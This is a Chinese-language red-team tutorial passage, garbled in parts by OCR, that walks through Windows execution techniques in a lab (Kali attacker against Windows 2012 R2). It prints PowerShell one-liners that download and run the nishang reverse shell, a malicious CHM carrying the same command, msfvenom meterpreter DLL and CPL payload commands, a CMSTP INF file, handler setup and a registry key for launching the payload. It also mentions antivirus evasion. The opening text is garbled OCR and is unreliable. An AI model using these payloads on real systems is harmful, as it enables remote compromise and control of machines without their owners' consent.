> 公 . H ..
>
> 东战 Ii
>
> \
> . A .
>
> e 毛 哇 =
>
> ．巳·
>
> 邸 战 c 字体
>
> 硒 样式
>
> ， L
>
> 异常的公式结尾
>
> M icroso ft Word
>
> ＠ 汜 却 涸 迈 致啤 (k Po werShe ll -Nop -sto 平 Noni ·W Hidde
> n)．是苟 萃 h应 用程序c:\\windo心＼system 32\\cr
>
> 豆｝日 今 ． 0 ;
>
> 匮i雪 成 吩 设计 =布局 引用 邮件 审阅 视图
>
> 飞 扎 厂一二 A. A• 心 令 五 ．.－ !::. ． 宅 · 茬 圭 公. u .t\'
>
> 迦
>
> 粘贴 \... B I 旦 · 迦 x, x\'
>
> 飞 - . A . 因＠ 匡I - . ..!-..
>
> 芸贴板 F 字体 C 段 样式
>
> 异常的公式结尾.,
>
> Mic roso ft Word
>
> ![](media/image25.png)
Empire 成功获取目标shell
![](media/image26.jpeg){width="5.881944444444445in"
height="1.8149989063867016in"}
执行系统命令
![](media/image27.jpeg){width="5.8884055118110235in" height="1.11375in"}
## 命令行界面
环境： 攻击机：Kali（10.100.18.20） 被攻击机：Windows 2012 R2
（10.100.18.22） 攻击手法： C:\\Users\\Administrator\>PowerShell IEX
(New- Object
Net.WebClient).DownloadString( sercontent.com/samratashok/nishang/mast
er/Shells/Invoke-PowerShellTcp.ps1\');Invoverse -IPAddress
10.100.18.20 - Port 3333
![](media/image28.jpeg){width="5.737245188101487in"
height="1.0884372265966755in"}
Nc -lvp 3333
![](media/image29.jpeg){width="5.87924978127734in" height="2.6675in"}
流量分析：
![](media/image30.jpeg){width="5.750575240594926in"
height="3.713228346456693in"}
## 本地-Signed Script Proxy Execution(签名脚本代理执行)
环境： 攻击机：Kali（10.100.18.20） 被攻击机：Windows 2012 R2
（10.100.18.22）安装Python2.7（或者将py 文件打包成exe 格式可以免杀）
攻击手法： 在远程web 服务器根目录写入 1.sct 文件如下： pubprn.vbs 方式
> \
>
> \
>
> \ version=\"1.00\"
>
> classid=\"{AAAA1111-0000-0000-0000-0000FEEDACDC}\"
>
> remotable=\"true\"
>
> \>
>
> \
>
> \
>
> \
> var r = new ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\");
>
> \]\]\>
>
> \
>
> \
![](media/image31.jpeg){width="5.875in" height="0.64625in"}
在目标主机上执行
> cscript /b
> C:\\Windows\\System32\\Printing_Admin_Scripts\\zh-CN\\pubprn.vbs
> 127.0. 0.1 script:http://10.100.18.20:8000/1.sct
![](media/image32.jpeg){width="5.237725284339458in" height="3.58875in"}
Wscript 方式： 启动Empire 生成vbs 脚本
![](media/image33.jpeg){width="4.729635826771654in"
height="3.8655205599300086in"}
将launcher.vbs 传到目标主机并执行
![](media/image34.jpeg){width="5.887764654418198in"
height="1.0816666666666668in"}
Empire 成功获取目标代理
![](media/image35.jpeg){width="5.890588363954506in" height="0.72875in"}
![](media/image36.jpeg){width="5.8824737532808395in"
height="1.695832239720035in"}
## chm
环境： 攻击机：Kali（10.100.18.20） 被攻击机：Windows 2012 R2
（10.100.18.22）安装Python2.7（或者将py 文件打包成exe 格式可以免杀）
攻击手法：
创建恶意chm 文件如下：
![](media/image37.jpeg){width="5.8873447069116365in"
height="0.9899989063867016in"}
SIP.html
> \
>
> \blue team\
>
> \ Security
>
> \
>
> \ STA.html
>
> \
>
> \blue team\
>
> \ Network
>
> \
>
> \ Index.html
>
> \\\\Mousejack
> replay\\\\
>
> command exec
>
> \ width=1 he ight=1\>
>
> \
>
> \
>
> \ (New-Object
> Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/samratashok/n
> ishang/master/Shells/Invoke-PowerShellTcp.ps1\');Invoke-PowerShellTcp
> -Reverse
>
> -IPAddress 10.100.18.20 -Port 3333\"\>
>
> \
>
> \
>
> \
>
> x.Click();
>
> \
>
> \\
诱导用户点击执行
![](media/image38.jpeg){width="5.880720691163605in" height="3.67125in"}
成功获取反弹shell
![](media/image39.jpeg){width="5.886593394575678in" height="2.90125in"}
## CMSTP
环境： 攻击机：Kali（10.100.18.20） 被攻击机：Windows 2012 R2
（10.100.18.22）安装Python2.7（或者将py 文件打包成exe 格式可以免杀）
攻击手法： 1.通过Metasploit Framework 的msfvenom 生成恶意DLL 文件
（pentestlab.dll） 。 msfvenom -p windows/x64/meterpreter/reverse_tcp
LHOST=10.100.18.20 LPORT=3333 -f dll \> /root/Desktop/pentestlab.dll
INF 文件的RegisterOCXSection 需要包含恶意DLL
文件的本地路径或远程执行的WebDAV 位置。
![](media/image40.jpeg){width="5.88375656167979in"
height="2.479582239720035in"}
cmstp.inf
> \[version\] Signature=\$chicago\$ AdvancedINF=2.5
> \[DefaultInstall_SingleUser\]
>
> RegisterOCXs=RegisterOCXSection \[RegisterOCXSection\]
> C:\\Users\\Administrator\\Desktop\\pentestlab.dll \[Strings\]
>
> AppAct = \"SOFTWARE\\Microsoft\\Connection Manager\"
> ServiceName=\"Pentestlab\"
>
> ShortSvcName=\"Pentestlab\"
2、INF 文件的RegisterOCXSection 需要包含恶意DLL
文件的本地路径或远程执行的WebDAV 位置。 3、Metasploit multi/handler
模块需要配置为接收连接。
![](media/image41.jpeg){width="5.884631452318461in" height="3.01125in"}
4、当恶意INF 文件与cmstp 一起提供时，代码 将会在后台执行。 cmstp.exe /s
cmstp.inf
![](media/image42.jpeg){width="5.874668635170604in"
height="1.4804166666666667in"}
5、获得Meterpreter 会话。
![](media/image43.jpeg){width="5.874061679790026in"
height="2.1633333333333336in"}
![](media/image44.jpeg){width="5.884724409448819in"
height="2.910416666666667in"}
## 本地-CPL
环境： 攻击机：Kali（10.100.18.20） 被攻击机：Windows 2012 R2
（10.100.18.22）安装Python2.7（或者将py 文件打包成exe 格式可以免杀）
攻击手法： 第一步是创建一个dll
并将其重命名为.cpl，以便它可以与控制面板一起执行，Metasploit 的Msfvenom
可以创建一个自定义的dll，其中可以包含一个嵌入的meterpreter
有效载荷或者Didier Stevens 的 cmd DLL 文件，可以用来绕过禁 止 cmd 运 行
的 限 制 。 1 、 msfvenom 生 成 payload msfvenom -p
windows/meterpreter/reverse_tcp -b \'\\x00\\xff\' lhost=10.100.18.20
lport=3333 -f dll -o pentestlab.cpl
![](media/image45.jpeg){width="5.872622484689414in" height="1.05875in"}
2 、 msf 设 置 use exploit/multi/handler set payload
windows/meterpreter/reverse_tcp set LHOST 10.100.18.20 set LPORT 3333
exploit -j
![](media/image46.jpeg){width="5.882577646544182in"
height="2.837083333333333in"}
3、以下命令将创建一个注册表键，这个注册表键的值将包含存储在主机上的CPL
文件的路径。 默认情况下，标准用户对自己的配置单元是具有写入权限的。 reg
add \"HKEYLOCALMACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Co
ntrol Panel\\Cpls\" /v pentestlab.cpl /t REG_SZ /d
\"C:\\cpl\\pentestlab.cpl\"
![](media/image47.jpeg){width="5.8837029746281715in"
height="1.0220833333333332in"}
![](media/image48.jpeg){width="5.885285433070866in"
height="2.6904166666666667in"}
4.打开控制面板执行payload 或者control pentestlab.cpl，获取Meterpreter
会话
![](media/image49.jpeg){width="5.885593832020997in"
height="0.9854155730533684in"}
成功获取session
![](media/image50.jpeg){width="5.888020559930009in"
height="1.4804166666666667in"}
## 本地-Forfiles